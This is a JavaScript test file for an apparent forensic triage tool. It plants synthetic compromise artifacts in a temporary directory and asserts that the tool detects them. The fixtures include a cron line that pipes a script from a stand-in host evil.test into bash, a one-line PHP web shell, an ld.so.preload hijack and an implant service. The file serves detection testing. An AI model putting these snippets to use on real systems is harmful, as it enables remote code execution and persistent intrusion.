import assert from "node:assert/strict"
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import test from "node:test"

import { VerdictMcpError, VerdictMcpSession } from "../dist/src/index.js"

test("P1 FTS5 + P4 Linux dead-disk + P5 DAIR director + P6 binary triage work end-to-end", () => {
  const dir = mkdtempSync(join(tmpdir(), "verdict-p1456-"))
  try {
    // Build synthetic Linux rootfs with multiple persistence/webshell artifacts
    mkdirSync(join(dir, "etc", "systemd", "system"), { recursive: true })
    mkdirSync(join(dir, "etc", "cron.d"), { recursive: true })
    mkdirSync(join(dir, "var", "www", "html"), { recursive: true })
    mkdirSync(join(dir, "var", "log"), { recursive: true })
    writeFileSync(join(dir, "etc", "ld.so.preload"), "/lib/x86_64-linux-gnu/libevil.so\n")
    writeFileSync(join(dir, "etc", "cron.d", "backdoor"), "* * * * * root curl http://evil.test/s.sh | bash -i\n")
    writeFileSync(join(dir, "etc", "systemd", "system", "evil.service"), "[Service]\nExecStart=/tmp/implant\n")
    writeFileSync(join(dir, "var", "www", "html", "shell.php"), "<?php system($_GET['c']); ?>\n")
    writeFileSync(join(dir, "var", "log", "auth.log"), "Accepted publickey for root from 10.0.0.99\n")

    // Build synthetic ELF sample with suspicious string
    const binPath = join(dir, "implant.elf")
    writeFileSync(binPath, Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.from("VirtualAlloc /bin/sh http://c2.example/beacon")]))

    const session = new VerdictMcpSession()

    // P5: DAIR starts in Catalog
    const d1 = session.callTool("conduct_assess", {})
    assert.equal(d1.structuredContent.phase, "Catalog")
    assert.equal(d1.structuredContent.curiosity_budget, 0)

    // Curiosity probe denied when budget is 0
    const deniedProbe = session.callTool("record_curiosity_probe", { rationale: "hunch", target: "/etc" })
    assert.equal(deniedProbe.isError, true)

    // P4: Linux dead-disk triage
    const linuxRes = session.callTool("triage_linux_disk", { rootfs: dir, detail: "complete" })
    assert.equal(linuxRes.isError, undefined)
    const hits = linuxRes.structuredContent.normalized_result.hits
    assert.ok(hits.some((h) => h.category === "ld_preload"))
    assert.ok(hits.some((h) => h.category === "persistence_cron"))
    assert.ok(hits.some((h) => h.category === "persistence_systemd"))
    assert.ok(hits.some((h) => h.category === "webshell"))
    assert.ok(hits.some((h) => h.category === "auth"))

    // P6: Binary triage (execution-free)
    const binRes = session.callTool("triage_binary", { path: binPath, detail: "complete" })
    assert.equal(binRes.isError, undefined)
    assert.equal(binRes.structuredContent.normalized_result.format, "ELF")
    assert.ok(binRes.structuredContent.normalized_result.suspicious_strings.some((s) => s.includes("c2.example")))

    // P1: SQLite FTS5 cross-artifact search finds both Linux and Malware evidence automatically
    const ftsLinux = session.callTool("search_evidence", { query: "libevil" })
    assert.equal(ftsLinux.structuredContent.hits.length, 1)
    assert.equal(ftsLinux.structuredContent.hits[0].artifact_class, "linux")

    const ftsBin = session.callTool("search_evidence", { query: "c2.example" })
    assert.equal(ftsBin.structuredContent.hits.length, 1)
    assert.equal(ftsBin.structuredContent.hits[0].artifact_class, "malware")

    // P5: DAIR advances to Correlate and grants curiosity_budget
    const d2 = session.callTool("conduct_assess", {})
    assert.ok(d2.structuredContent.curiosity_budget >= 1)
    const probeOk = session.callTool("record_curiosity_probe", {
      rationale: "Check if implant references cron persistence",
      target: "implant.elf",
    })
    assert.equal(probeOk.isError, undefined)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test("TRUDI negative_from_truncated gate blocks absence claims backed only by partial coverage", () => {
  const session = new VerdictMcpSession()
  const partialRec = session.ledger.retain({
    tool: "pcap_sweep",
    artifact_class: "network",
    parameters: { pcap: "nitroba.pcap" },
    analysis_profile: null,
    normalized_result: { hits: [] },
    coverage: { scope: "pcap-partial", status: "partial" },
    limitations: ["Truncated at 500 frames"],
  })
  assert.throws(
    () =>
      session.findings.record(session.ledger, {
        title: "No C2 traffic",
        claim: "No match for attacker domain; host is clean",
        severity: "info",
        status: "refuted",
        evidence_refs: [partialRec.evidence_id],
      }),
    (err) => err instanceof VerdictMcpError && err.code === "forensic_rule_violation" && err.details?.rule === "negative_from_truncated",
  )
})
